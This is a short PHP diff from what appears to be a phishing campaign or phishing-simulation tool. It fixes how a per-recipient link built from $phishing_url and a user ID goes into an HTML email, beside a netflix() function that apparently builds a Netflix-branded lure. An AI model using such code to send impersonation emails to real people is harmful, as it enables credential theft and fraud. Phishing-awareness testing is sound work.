@@ -122,7 +122,7 @@ foreach ($user_id as $uid) {
         $mailContent = "<h1>Send HTML Email using SMTP in PHP</h1>
         <p>This is a test email I’m sending using SMTP mail server with PHPMailer.</p>
         <br>
-        <a href='$phishing_url.'/?uid='.$vid' >Click en el siguiente link</a>";
+        <a href='$phishing_url/?uid=$vid' >Click en el siguiente link</a>";
     }else{
         $url_attack = $phishing_url.'/?uid='.$vid;
         $mailContent = netflix($url_attack); 
